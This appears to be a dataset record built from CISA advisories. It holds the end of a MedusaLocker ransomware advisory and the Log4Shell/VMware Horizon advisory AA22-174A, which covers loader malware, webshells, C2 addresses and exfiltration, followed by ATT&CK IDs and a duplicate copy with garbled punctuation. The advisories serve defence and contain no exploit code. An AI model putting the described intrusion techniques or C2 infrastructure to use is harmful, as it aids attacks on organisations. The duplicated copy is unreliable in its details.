MedusaLocker actors place a ransom note into every folder containing a file with the victim's encrypted data. The note outlines how to communicate with the MedusaLocker actors, typically providing victims one or more email address at which the actors can be reached. The size of MedusaLocker ransom demands appears to vary depending on the victim’s financial status as perceived by the actors.  
Indicators of Compromise

 

 

 

 

 

 

Disclaimer: Many of these observed IP addresses are several years old and have been historically linked to MedusaLocker ransomware. We recommend these IP addresses be investigated or vetted by organizations prior to taking action, such as blocking.

 
MITRE ATT&CK Techniques
MedusaLocker actors use the ATT&CK techniques listed in Table 1.
Table 1: MedusaLocker Actors ATT&CK Techniques for Enterprise

 

Mitigations


Implement a recovery plan that maintains and retains multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, or the cloud).
Implement network segmentation and maintain offline backups of data to ensure limited interruption to the organization.
Regularly back up data and password protect backup copies stored offline. Ensure copies of critical data are not accessible for modification or deletion from the system where the data resides.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Install updates for operating systems, software, and firmware as soon as possible.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege. 
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Enforce multifactor authentication (MFA).
Use National Institute of Standards and Technology (NIST) standards for developing and managing password policies:

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords.
Implement multiple failed login attempt account lockouts.
Disable password “hints”.
Refrain from requiring password changes unless there is evidence of password compromise. Note: NIST guidance suggests favoring longer passwords and no longer require regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Only use secure networks; avoid using public Wi-Fi networks.
Consider installing and using a virtual private network (VPN) to establish secure remote connections.
Focus on cybersecurity awareness and training. Regularly provide users with training on information security principles and techniques as well as overall emerging cybersecurity risks and vulnerabilities, such as ransomware and phishing scams.

 Resources

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment

Reporting

To report an incident and request technical assistance, contact CISA at Central@cisa.dhs.gov or 888-282-0870, or FBI through a local field office. 
Financial Institutions must ensure compliance with any applicable Bank Secrecy Act requirements, including suspicious activity reporting obligations. Indicators of compromise (IOCs), such as suspicious email addresses, file names, hashes, domains, and IP addresses, can be provided under Item 44 of the Suspicious Activity Report (SAR) form. For more information on mandatory and voluntary reporting of cyber events via SARs, see FinCEN Advisory FIN-2016-A005, Advisory to Financial Institutions on Cyber-Events and Cyber-Enabled Crime, October 25, 2016; and FinCEN Advisory FIN-2021-A004, Advisory on Ransomware and the Use of the Financial System to Facilitate Ransom Payments, November 8, 2021, which updates FinCEN Advisory FIN-2020-A006.
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.


Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field-offices. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To report incidents and anomalous activity or to request incident response resources or technical assistance related to this threat, contact CISA at SayCISA@cisa.dhs.gov.

Revisions

June 30, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-181a
45,"




Summary

Actions to take today:
• Install fixed builds, updating all affected VMware Horizon and UAG systems to the latest versions. If updates or workarounds were not promptly applied following VMware’s release of updates for Log4Shell in December 2021, treat all affected VMware systems as compromised.
• Minimize the internet-facing attack surface by hosting essential services on a segregated demilitarized (DMZ) zone, ensuring strict network perimeter access controls, and implementing regularly updated web application firewalls (WAFs) in front of public-facing services
The Cybersecurity and Infrastructure Security Agency (CISA) and United States Coast Guard Cyber Command (CGCYBER) are releasing this joint Cybersecurity Advisory (CSA) to warn network defenders that cyber threat actors, including state-sponsored advanced persistent threat (APT) actors, have continued to exploit CVE-2021-44228 (Log4Shell) in VMware Horizon® and Unified Access Gateway (UAG) servers to obtain initial access to organizations that did not apply available patches or workarounds.
Since December 2021, multiple threat actor groups have exploited Log4Shell on unpatched, public-facing VMware Horizon and UAG servers. As part of this exploitation, suspected APT actors implanted loader malware on compromised systems with embedded executables enabling remote command and control (C2). In one confirmed compromise, these APT actors were able to move laterally inside the network, gain access to a disaster recovery network, and collect and exfiltrate sensitive data.
This CSA provides the suspected APT actors’ tactics, techniques, and procedures (TTPs), information on the loader malware, and indicators of compromise (IOCs). The information is derived from two related incident response engagements and malware analysis of samples discovered on the victims’ networks.
CISA and CGCYBER recommend all organizations with affected systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities using the IOCs provided in this CSA, Malware Analysis Report MAR-10382580-1, and MAR-10382254-1. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to CISA.
Update July 18, 2022:
This Cybersecurity Advisory (CSA) has been updated with additional Malware Analysis Report MAR-10382580-2, which provides additional indicators of compromise (IOCs). 
Update End
See the list below to download copies of IOCs: 

AA22-174A stix
MAR-10382254-1 stix
MAR-10382580-1 stix
Update July 18, 2022: MAR-10382580-2 stix

Download the pdf version of this report: [pdf, 426 kb]

Technical Details

Note: this advisory uses the MITRE ATT&CK for Enterprise framework, version 11. See Appendix A for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques.
Log4Shell is a remote code execution vulnerability affecting the Apache® Log4j library and a variety of products using Log4j, such as consumer and enterprise services, websites, applications, and other products, including certain versions of VMware Horizon and UAG. The vulnerability enables malicious cyber actors to submit a specially crafted request to a vulnerable system, causing the system to execute arbitrary code. The request allows the malicious actors to take full control of the affected system. (For more information on Log4Shell, see CISA’s Apache Log4j Vulnerability Guidance webpage and VMware advisory VMSA-2021-0028.13.) 
VMware made fixes available in December 2021 and confirmed exploitation in the wild on December 10, 2021.[1] Since December 2021, multiple cyber threat actor groups have exploited [T1190] Log4Shell on unpatched, public-facing VMware Horizon and UAG servers to obtain initial access [TA0001] to networks. 
After obtaining access, some actors implanted loader malware on compromised systems with embedded executables enabling remote C2. These actors connected to known malicious IP address 104.223.34[.]198.[2] This IP address uses a self-signed certificate CN: WIN-P9NRMH5G6M8. In at least one confirmed compromise, the actors collected and exfiltrated sensitive information from the victim’s network. 
The sections below provide information CISA and CGCYBER obtained during incident response activities at two related confirmed compromises.
Victim 1
CGCYBER conducted a proactive threat-hunting engagement at an organization (Victim 1) compromised by actors exploiting Log4Shell in VMware Horizon. After obtaining access, threat actors uploaded malware, hmsvc.exe, to a compromised system. During malware installation, connections to IP address 104.223.34[.]198 were observed. 
CISA and CGCYBER analyzed a sample of hmsvc.exe from the confirmed compromise. hmsvc.exe masquerades as a legitimate Microsoft® Windows® service (SysInternals LogonSessions software) [T1036.004] and appears to be a modified version of SysInternals LogonSessions software embedded with malicious packed code. When discovered, the analyzed sample of hmsvc.exe was running as NT AUTHORITY\SYSTEM, the highest privilege level on a Windows system. It is unknown how the actors elevated privileges. 
hmsvc.exe is a Windows loader containing an embedded executable, 658_dump_64.exe. The embedded executable is a remote access tool that provides an array of C2 capabilities, including the ability to log keystrokes [T1056.001], upload and execute additional payloads [T1105], and provide graphical user interface (GUI) access over a target Windows system's desktop. The malware can function as a C2 tunneling proxy [T1090], allowing a remote operator to pivot to other systems and move further into a network.
When first executed, hmsvc.exe creates the Scheduled Task [T1053.005], C:\Windows\System32\Tasks\Local Session Updater, which executes malware every hour. When executed, two randomly named *.tmp files are written to the disk at the location C:\Users\<USER>\AppData\Local\Temp\ and the embedded executable attempts to connect to hard-coded C2 server 192.95.20[.]8 over port 4443, a non-standard port [TT571]. The executable’s inbound and outbound communications are encrypted with a 128-bit key [T1573.001].
For more information on hmsvc.exe, including IOCs and detection signatures, see MAR-10382254-1.
Victim 2
From late April through May 2022, CISA conducted an onsite incident response engagement at an organization (Victim 2) where CISA observed bi-directional traffic between the organization and suspected APT IP address 104.223.34[.]198. During incident response, CISA determined Victim 2 was compromised by multiple threat actor groups. 
The threat actors using IP 104.223.34[.]198 gained initial access to Victim 2’s production environment in late January 2022, or earlier. These actors likely obtained access by exploiting Log4Shell in an unpatched VMware Horizon server. On or around January 30, likely shortly after the threat actors gained access, CISA observed the actors using PowerShell scripts [T1059.001] to callout to 109.248.150[.]13 via Hypertext Transfer Protocol (HTTP) [T1071.001] to retrieve additional PowerShell scripts. Around the same period, CISA observed the actors attempt to download [T1105] and execute a malicious file from 109.248.150[.]13. The activity started from IP address 104.155.149[.]103, which appears to be part of the actors’ C2 [TA0011] infrastructure. 
After gaining initial access to the VMware Horizon server, the threat actors moved laterally [TA0008] via Remote Desktop Protocol (RDP) [T1021.001] to multiple other hosts in the production environment, including a security management server, a certificate server, a database containing sensitive law enforcement data, and a mail relay server. The threat actors also moved laterally via RDP to the organization’s disaster recovery network. The threat actors gained credentials [TA0006] for multiple accounts, including administrator accounts. It is unknown how these credentials were acquired. 
After moving laterally to other production environment hosts and servers, the actors implanted loader malware on compromised servers containing executables enabling remote C2. The threat actors used compromised administrator accounts to run the loader malware. The loader malware appears to be modified versions of SysInternals LogonSessions, Du, or PsPing software. The embedded executables belong to the same malware family, are similar in design and functionality to 658_dump_64.exe, and provide C2 capabilities to a remote operator. These C2 capabilities include the ability to remotely monitor a system's desktop, gain reverse shell access, exfiltrate data, and upload and execute additional payloads. The embedded executables can also function as a proxy. 
CISA found the following loader malware:

SvcEdge.exe is a malicious Windows loader containing encrypted executable f7_dump_64.exe. When executed, SvcEdge.exe decrypts and loads f7_dump_64.exe into memory. During runtime, f7_dump_64.exe connects to hard-coded C2 server 134.119.177[.]107 over port 443. 
odbccads.exe is a malicious Windows loader containing an encrypted executable. When executed, odbccads.exe decrypts and loads the executable into memory. The executable attempts communication with the remote C2 address 134.119.177[.]107. 
praiser.exe is a Windows loader containing an encrypted executable. When executed, praiser.exe decrypts and loads the executable into memory. The executable attempts connection to hard-coded C2 address 162.245.190[.]203.
fontdrvhosts.exe is a Windows loader that contains an encrypted executable. When executed, fontdrvhosts.exe decrypts and loads the executable into memory. The executable attempts connection to hard-coded C2 address 155.94.211[.]207.
winds.exe is a Windows loader containing an encrypted malicious executable and was found on a server running as a service. During runtime, the encrypted executable is decrypted and loaded into memory. The executable attempts communication with hard-coded C2 address 185.136.163[.]104. winds.exe has complex obfuscation, hindering the analysis of its code structures. The executable’s inbound and outbound communications are encrypted with an XOR key [T1573.001].

For more information on these malware samples, including IOCs and detection signatures, see MAR-10382580-1.
Additionally, CISA identified a Java® Server Pages (JSP) application (error_401.js) functioning as a malicious webshell [T505.003] and a malicious Dynamic Link Library (DLL) file:

error_401.jsp is a webshell designed to parse data and commands from incoming HTTP requests, providing a remote operator C2 capabilities over compromised Linux and Windows systems. error_401.jsp allows actors to retrieve files from the target system, upload files to the target system, and execute commands on the target system. rtelnet is used to execute commands on the target system. Commands and data sent are encrypted via RC4 [T1573.001]. For more information on error_401.jsp, including IOCs, see [MAR-10382580 2].
newdev.dll ran as a service in the profile of a known compromised user on a mail relay server. The malware had path: C:\Users\<user>\AppData\Roaming\newdev.dll. The DLL may be the same newdev.dll attributed to the APT actors in open-source reporting; however, CISA was unable to recover the file for analysis. 

Threat actors collected [TA0009] and likely exfiltrated [TA0010] data from Victim 2’s production environment. For a three week period, the security management and certificate servers communicated with the foreign IP address 92.222.241[.]76. During this same period, the security management server sent more than 130 gigabytes (GB) of data to foreign IP address 92.222.241[.]76, indicating the actors likely exfiltrated data from the production environment. CISA also found .rar files containing sensitive law enforcement investigation data [T1560.001] under a known compromised administrator account.
Note: the second threat actor group had access to the organization's test and production environments, and on or around April 13, 2022, leveraged CVE-2022-22954 to implant the Dingo J-spy webshell. According to trusted third-party reporting, multiple large organizations have been targeted by cyber actors leveraging CVE-2022-22954 and CVE-2022-22960. For more information on exploitation of CVE-2022-22954 and CVE-2022-22960, see CISA CSA Threat Actors Chaining Unpatched VMware Vulnerabilities for Full System Control.
Incident Response
If administrators discover system compromise, CISA and CGCYBER recommend:

Immediately isolating affected systems. 
Collecting and reviewing relevant logs, data, and artifacts.
Considering soliciting support from a third-party incident response organization that can provide subject matter expertise, ensure the actor is eradicated from the network, and avoid residual issues that could enable follow-on exploitation.
Reporting incidents to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870). To report cyber incidents to the Coast Guard pursuant to 33 CFR Section 101.305,  contact the U.S. Coast Guard (USCG) National Response Center (NRC) (NRC@uscg.mil or 800-424-8802). 


Mitigations

CISA and CGCYBER recommend organizations install updated builds to ensure affected VMware Horizon and UAG systems are updated to the latest version.

If updates or workarounds were not promptly applied following VMware’s release of updates for Log4Shell in December 2021, treat those VMware Horizon systems as compromised. Follow the pro-active incident response procedures outlined above prior to applying updates. If no compromise is detected, apply these updates as soon as possible.

See VMware Security Advisory VMSA-2021-0028.13 and VMware Knowledge Base (KB) 87073 to determine which VMware Horizon components are vulnerable.
Note: until the update is fully implemented, consider removing vulnerable components from the internet to limit the scope of traffic. While installing the updates, ensure network perimeter access controls are as restrictive as possible.
If upgrading is not immediately feasible, see KB87073 and KB87092 for vendor-provided temporary workarounds. Implement temporary solutions using an account with administrative privileges. Note that these temporary solutions should not be treated as permanent fixes; vulnerable components should be upgraded to the latest build as soon as possible. 
Prior to implementing any temporary solution, ensure appropriate backups have been completed. 
Verify successful implementation of mitigations by executing the vendor supplied script Horizon_Windows_Log4j_Mitigations.zip without parameters to ensure that no vulnerabilities remain. See KB87073 for details. 



Additionally, CISA and CGCYBER recommend organizations:

Keep all software up to date and prioritize patching known exploited vulnerabilities (KEVs). 
Minimize the internet-facing attack surface by hosting essential services on a segregated DMZ, ensuring strict network perimeter access controls, and not hosting internet-facing services non-essential to business operations. Where possible, implement regularly updated WAFs in front of public-facing services. WAFs can protect against web based exploitation using signatures and heuristics that are likely to block or alert on malicious traffic.
Use best practices for identity and access management (IAM) by implementing multifactor authentication (MFA), enforcing use of strong passwords, and limiting user access through the principle of least privilege.

Contact Information
Recipients of this report are encouraged to contribute any additional information related to this threat.

To request incident response resources or technical assistance related to these threats, email CISA at report@cisa.gov. To contact Coast Guard Cyber Command in relation to these threats, email maritimecyber@uscg.mil.
To report cyber incidents to the Coast Guard pursuant to 33 CFR Section 101.305  contact the USCG NRC (NRC@uscg.mil or 800-424-8802).

Resources

For more information on Log4Shell, see:

CISA’s Apache Log4j Vulnerability Guidance webpage,
Joint CSA Mitigating Log4Shell and Other Log4j-Related Vulnerabilities, or
CISA’s database of known vulnerable services on the CISA GitHub® page.


See National Security Agency (NSA) and Australian Signals Directorate (ASD) guidance Block and Defend Web Shell Malware for additional guidance on hardening internet-facing systems.

References
[1] VMware Security Advisory VMSA-2021-0028.13
[2] Fortinet’s blog New Milestones for Deep Panda: Log4Shell and Digitally Signed Fire Chili Rootkits
Appendix A: Indicators of Compromise
See MAR-10382580-1 and MAR-10382254-1 and Table 1 for IOCs. See the list below to download copies of these IOCs: 

MAR-10382580-1 stix
MAR-10382254-1 stix

Table 1: Indicators of Compromise



Type
Indicator
Description




IP Address
104.223.34[.]198  
IP address closely associated with the installation of malware on victims.


92.222.241[.]76 
Victim 2 servers communicated with this IP address and sent data to it during a three-week period.


109.248.150[.]13 
Actors attempting to download and execute a malicious file from this address.


104.155.149[.]103 
Appears to be a part of the actors’ C2 infrastructure. 


Network Port
192.95.20[.]8:80   
Same description as IP 192.95.20[.]8, but includes the specific destination port of 80, which was identified in logs and during malware analysis.


1389 
This was the most common destination port for Log4Shell exploitation outbound connections.  Multiple unique destination addresses were used for Log4Shell callback.


104.223.34[.]198:443 
IP address closely associated to the installation of malware on victims with the specific destination port of 443.


Scheduled Task
C:\Windows\System32\Tasks\Local Session Update 
Scheduled task created by hmsvc.exe to execute the program hourly.


File Path
C:\Windows\Temp\lnk{4_RANDOM_CHARS}.tmp 
File created by hmsvc.exe with a random four-character filename.


C:\Windows\Temp\lnk<4_RANDOM_NUMS_CHAR S>.tmp
File created by hmsvc.exe with a random four-character filename.



Appendix B: Threat Actor TTPs
See Table 2 for the threat actors’ tactics and techniques identified in this CSA. See the MITRE ATT&CK for Enterprise framework, version 11, for all referenced threat actor tactics and techniques.
Table 2: Tactics and Techniques



Tactic
Technique




Initial Access [TA0001]
Exploit Public-Facing Application [T1190] 



Execution [TA0002]

Command and Scripting Interpreter: PowerShell [T1059.001]


Scheduled Task/Job: Scheduled Task [T1053.005]


Persistence [TA0003]
Server Software Component: Web Shell [T1505.003]


Defense Evasion [TA0005]
Masquerading: Masquerade Task or Service [T1036.004]


Credential Access [TA0006]
 


Lateral Movement [TA0008]
Remote Services: Remote Desktop Protocol [T1021.001]


Collection [TA0009] 
Archive Collected Data: Archive via Utility [T1560.001]


Input Capture: Keylogging [T1056.001]


Command and Control [TA0011]
Application Layer Protocol: Web Protocols [T1071.001]


Encrypted Channel: Symmetric Cryptography [1573.001]


Ingress Tool Transfer [T1105]


Non-Standard Port [T1571]


 
Proxy [T1090]



Disclaimer
© 2021 The MITRE Corporation. This work is reproduced and distributed with the permission of The MITRE Corporation.
Acknowledgements
CISA and CGCYBER would like to thank VMware and Secureworks for their contributions to this CSA.

Revisions

June 23, 2022: Initial version|June 24, 2022: Added link to AA22-174A.stix.xml|July 18, 2022: MAR-10382580-2 stix






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0003', 'TA0008', 'T1505.003', 'TA0010', 'T1571', 'T1573.001', 'TA0005', 'TA0006', 'T1190', 'T1560.001', 'T1105', 'TA0011', 'T1090', 'T1056.001', 'TA0001', 'TA0002', 'T1059.001', 'T1036.004', 'TA0009', 'T1021.001', 'T1071.001', 'T1053.005'}","




Summary

Actions to take today:
• Install fixed builds, updating all affected VMware Horizon and UAG systems to the latest versions. If updates or workarounds were not promptly applied following VMware’s release of updates for Log4Shell in December 2021, treat all affected VMware systems as compromised.
• Minimize the internet-facing attack surface by hosting essential services on a segregated demilitarized (DMZ) zone, ensuring strict network perimeter access controls, and implementing regularly updated web application firewalls (WAFs) in front of public-facing services
The Cybersecurity and Infrastructure Security Agency (CISA) and United States Coast Guard Cyber Command (CGCYBER) are releasing this joint Cybersecurity Advisory (CSA) to warn network defenders that cyber threat actors, including state-sponsored advanced persistent threat (APT) actors, have continued to exploit CVE-2021-44228 (Log4Shell) in VMware Horizon® and Unified Access Gateway (UAG) servers to obtain initial access to organizations that did not apply available patches or workarounds.
Since December 2021, multiple threat actor groups have exploited Log4Shell on unpatched, public-facing VMware Horizon and UAG servers. As part of this exploitation, suspected APT actors implanted loader malware on compromised systems with embedded executables enabling remote command and control (C2). In one confirmed compromise, these APT actors were able to move laterally inside the network, gain access to a disaster recovery network, and collect and exfiltrate sensitive data.
This CSA provides the suspected APT actors’ tactics, techniques, and procedures (TTPs), information on the loader malware, and indicators of compromise (IOCs). The information is derived from two related incident response engagements and malware analysis of samples discovered on the victims’ networks.
CISA and CGCYBER recommend all organizations with affected systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities using the IOCs provided in this CSA, Malware Analysis Report MAR-10382580-1, and MAR-10382254-1. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to CISA.
Update July 18, 2022:
This Cybersecurity Advisory (CSA) has been updated with additional Malware Analysis Report MAR-10382580-2, which provides additional indicators of compromise (IOCs). 
Update End
See the list below to download copies of IOCs: 

AA22-174A stix
MAR-10382254-1 stix
MAR-10382580-1 stix
Update July 18, 2022: MAR-10382580-2 stix

Download the pdf version of this report:,pdf, 426 kb,

Technical Details

Note: this advisory uses the MITRE ATT&CK for Enterprise framework, version 11. See Appendix A for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques.
Log4Shell is a remote code execution vulnerability affecting the Apache® Log4j library and a variety of products using Log4j, such as consumer and enterprise services, websites, applications, and other products, including certain versions of VMware Horizon and UAG. The vulnerability enables malicious cyber actors to submit a specially crafted request to a vulnerable system, causing the system to execute arbitrary code. The request allows the malicious actors to take full control of the affected system. (For more information on Log4Shell, see CISA’s Apache Log4j Vulnerability Guidance webpage and VMware advisory VMSA-2021-0028.13.) 
VMware made fixes available in December 2021 and confirmed exploitation in the wild on December 10, 2021.,1, Since December 2021, multiple cyber threat actor groups have exploited, Log4Shell on unpatched, public-facing VMware Horizon and UAG servers to obtain initial access, to networks. 
After obtaining access, some actors implanted loader malware on compromised systems with embedded executables enabling remote C2. These actors connected to known malicious IP address 104.223.34,.,198.,2, This IP address uses a self-signed certificate CN: WIN-P9NRMH5G6M8. In at least one confirmed compromise, the actors collected and exfiltrated sensitive information from the victim’s network. 
The sections below provide information CISA and CGCYBER obtained during incident response activities at two related confirmed compromises.
Victim 1
CGCYBER conducted a proactive threat-hunting engagement at an organization (Victim 1) compromised by actors exploiting Log4Shell in VMware Horizon. After obtaining access, threat actors uploaded malware, hmsvc.exe, to a compromised system. During malware installation, connections to IP address 104.223.34,.,198 were observed. 
CISA and CGCYBER analyzed a sample of hmsvc.exe from the confirmed compromise. hmsvc.exe masquerades as a legitimate Microsoft® Windows® service (SysInternals LogonSessions software), and appears to be a modified version of SysInternals LogonSessions software embedded with malicious packed code. When discovered, the analyzed sample of hmsvc.exe was running as NT AUTHORITY\SYSTEM, the highest privilege level on a Windows system. It is unknown how the actors elevated privileges. 
hmsvc.exe is a Windows loader containing an embedded executable, 658_dump_64.exe. The embedded executable is a remote access tool that provides an array of C2 capabilities, including the ability to log keystrokes, upload and execute additional payloads, and provide graphical user interface (GUI) access over a target Windows system's desktop. The malware can function as a C2 tunneling proxy, allowing a remote operator to pivot to other systems and move further into a network.
When first executed, hmsvc.exe creates the Scheduled Task, C:\Windows\System32\Tasks\Local Session Updater, which executes malware every hour. When executed, two randomly named *.tmp files are written to the disk at the location C:\Users\<USER>\AppData\Local\Temp\ and the embedded executable attempts to connect to hard-coded C2 server 192.95.20,.,8 over port 4443, a non-standard port,TT571,. The executable’s inbound and outbound communications are encrypted with a 128-bit key,.
For more information on hmsvc.exe, including IOCs and detection signatures, see MAR-10382254-1.
Victim 2
From late April through May 2022, CISA conducted an onsite incident response engagement at an organization (Victim 2) where CISA observed bi-directional traffic between the organization and suspected APT IP address 104.223.34,.,198. During incident response, CISA determined Victim 2 was compromised by multiple threat actor groups. 
The threat actors using IP 104.223.34,.,198 gained initial access to Victim 2’s production environment in late January 2022, or earlier. These actors likely obtained access by exploiting Log4Shell in an unpatched VMware Horizon server. On or around January 30, likely shortly after the threat actors gained access, CISA observed the actors using PowerShell scripts, to callout to 109.248.150,.,13 via Hypertext Transfer Protocol (HTTP), to retrieve additional PowerShell scripts. Around the same period, CISA observed the actors attempt to download, and execute a malicious file from 109.248.150,.,13. The activity started from IP address 104.155.149,.,103, which appears to be part of the actors’ C2, infrastructure. 
After gaining initial access to the VMware Horizon server, the threat actors moved laterally, via Remote Desktop Protocol (RDP), to multiple other hosts in the production environment, including a security management server, a certificate server, a database containing sensitive law enforcement data, and a mail relay server. The threat actors also moved laterally via RDP to the organization’s disaster recovery network. The threat actors gained credentials, for multiple accounts, including administrator accounts. It is unknown how these credentials were acquired. 
After moving laterally to other production environment hosts and servers, the actors implanted loader malware on compromised servers containing executables enabling remote C2. The threat actors used compromised administrator accounts to run the loader malware. The loader malware appears to be modified versions of SysInternals LogonSessions, Du, or PsPing software. The embedded executables belong to the same malware family, are similar in design and functionality to 658_dump_64.exe, and provide C2 capabilities to a remote operator. These C2 capabilities include the ability to remotely monitor a system's desktop, gain reverse shell access, exfiltrate data, and upload and execute additional payloads. The embedded executables can also function as a proxy. 
CISA found the following loader malware:

SvcEdge.exe is a malicious Windows loader containing encrypted executable f7_dump_64.exe. When executed, SvcEdge.exe decrypts and loads f7_dump_64.exe into memory. During runtime, f7_dump_64.exe connects to hard-coded C2 server 134.119.177,.,107 over port 443. 
odbccads.exe is a malicious Windows loader containing an encrypted executable. When executed, odbccads.exe decrypts and loads the executable into memory. The executable attempts communication with the remote C2 address 134.119.177,.,107. 
praiser.exe is a Windows loader containing an encrypted executable. When executed, praiser.exe decrypts and loads the executable into memory. The executable attempts connection to hard-coded C2 address 162.245.190,.,203.
fontdrvhosts.exe is a Windows loader that contains an encrypted executable. When executed, fontdrvhosts.exe decrypts and loads the executable into memory. The executable attempts connection to hard-coded C2 address 155.94.211,.,207.
winds.exe is a Windows loader containing an encrypted malicious executable and was found on a server running as a service. During runtime, the encrypted executable is decrypted and loaded into memory. The executable attempts communication with hard-coded C2 address 185.136.163,.,104. winds.exe has complex obfuscation, hindering the analysis of its code structures. The executable’s inbound and outbound communications are encrypted with an XOR key,.

For more information on these malware samples, including IOCs and detection signatures, see MAR-10382580-1.
Additionally, CISA identified a Java® Server Pages (JSP) application (error_401.js) functioning as a malicious webshell,T505.003, and a malicious Dynamic Link Library (DLL) file:

error_401.jsp is a webshell designed to parse data and commands from incoming HTTP requests, providing a remote operator C2 capabilities over compromised Linux and Windows systems. error_401.jsp allows actors to retrieve files from the target system, upload files to the target system, and execute commands on the target system. rtelnet is used to execute commands on the target system. Commands and data sent are encrypted via RC4,. For more information on error_401.jsp, including IOCs, see,MAR-10382580 2,.
newdev.dll ran as a service in the profile of a known compromised user on a mail relay server. The malware had path: C:\Users\<user>\AppData\Roaming\newdev.dll. The DLL may be the same newdev.dll attributed to the APT actors in open-source reporting; however, CISA was unable to recover the file for analysis. 

Threat actors collected, and likely exfiltrated, data from Victim 2’s production environment. For a three week period, the security management and certificate servers communicated with the foreign IP address 92.222.241,.,76. During this same period, the security management server sent more than 130 gigabytes (GB) of data to foreign IP address 92.222.241,.,76, indicating the actors likely exfiltrated data from the production environment. CISA also found .rar files containing sensitive law enforcement investigation data, under a known compromised administrator account.
Note: the second threat actor group had access to the organization's test and production environments, and on or around April 13, 2022, leveraged CVE-2022-22954 to implant the Dingo J-spy webshell. According to trusted third-party reporting, multiple large organizations have been targeted by cyber actors leveraging CVE-2022-22954 and CVE-2022-22960. For more information on exploitation of CVE-2022-22954 and CVE-2022-22960, see CISA CSA Threat Actors Chaining Unpatched VMware Vulnerabilities for Full System Control.
Incident Response
If administrators discover system compromise, CISA and CGCYBER recommend:

Immediately isolating affected systems. 
Collecting and reviewing relevant logs, data, and artifacts.
Considering soliciting support from a third-party incident response organization that can provide subject matter expertise, ensure the actor is eradicated from the network, and avoid residual issues that could enable follow-on exploitation.
Reporting incidents to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870). To report cyber incidents to the Coast Guard pursuant to 33 CFR Section 101.305,  contact the U.S. Coast Guard (USCG) National Response Center (NRC) (NRC@uscg.mil or 800-424-8802). 


Mitigations

CISA and CGCYBER recommend organizations install updated builds to ensure affected VMware Horizon and UAG systems are updated to the latest version.

If updates or workarounds were not promptly applied following VMware’s release of updates for Log4Shell in December 2021, treat those VMware Horizon systems as compromised. Follow the pro-active incident response procedures outlined above prior to applying updates. If no compromise is detected, apply these updates as soon as possible.

See VMware Security Advisory VMSA-2021-0028.13 and VMware Knowledge Base (KB) 87073 to determine which VMware Horizon components are vulnerable.
Note: until the update is fully implemented, consider removing vulnerable components from the internet to limit the scope of traffic. While installing the updates, ensure network perimeter access controls are as restrictive as possible.
If upgrading is not immediately feasible, see KB87073 and KB87092 for vendor-provided temporary workarounds. Implement temporary solutions using an account with administrative privileges. Note that these temporary solutions should not be treated as permanent fixes; vulnerable components should be upgraded to the latest build as soon as possible. 
Prior to implementing any temporary solution, ensure appropriate backups have been completed. 
Verify successful implementation of mitigations by executing the vendor supplied script Horizon_Windows_Log4j_Mitigations.zip without parameters to ensure that no vulnerabilities remain. See KB87073 for details. 



Additionally, CISA and CGCYBER recommend organizations:

Keep all software up to date and prioritize patching known exploited vulnerabilities (KEVs). 
Minimize the internet-facing attack surface by hosting essential services on a segregated DMZ, ensuring strict network perimeter access controls, and not hosting internet-facing services non-essential to business operations. Where possible, implement regularly updated WAFs in front of public-facing services. WAFs can protect against web based exploitation using signatures and heuristics that are likely to block or alert on malicious traffic.
Use best practices for identity and access management (IAM) by implementing multifactor authentication (MFA), enforcing use of strong passwords, and limiting user access through the principle of least privilege.

Contact Information
Recipients of this report are encouraged to contribute any additional information related to this threat.

To request incident response resources or technical assistance related to these threats, email CISA at report@cisa.gov. To contact Coast Guard Cyber Command in relation to these threats, email maritimecyber@uscg.mil.
To report cyber incidents to the Coast Guard pursuant to 33 CFR Section 101.305  contact the USCG NRC (NRC@uscg.mil or 800-424-8802).

Resources

For more information on Log4Shell, see:

CISA’s Apache Log4j Vulnerability Guidance webpage,
Joint CSA Mitigating Log4Shell and Other Log4j-Related Vulnerabilities, or
CISA’s database of known vulnerable services on the CISA GitHub® page.


See National Security Agency (NSA) and Australian Signals Directorate (ASD) guidance Block and Defend Web Shell Malware for additional guidance on hardening internet-facing systems.

References,1, VMware Security Advisory VMSA-2021-0028.13,2, Fortinet’s blog New Milestones for Deep Panda: Log4Shell and Digitally Signed Fire Chili Rootkits
Appendix A: Indicators of Compromise
See MAR-10382580-1 and MAR-10382254-1 and Table 1 for IOCs. See the list below to download copies of these IOCs: 

MAR-10382580-1 stix
MAR-10382254-1 stix

Table 1: Indicators of Compromise

Appendix B: Threat Actor TTPs
See Table 2 for the threat actors’ tactics and techniques identified in this CSA. See the MITRE ATT&CK for Enterprise framework, version 11, for all referenced threat actor tactics and techniques.
Table 2: Tactics and Techniques

Disclaimer
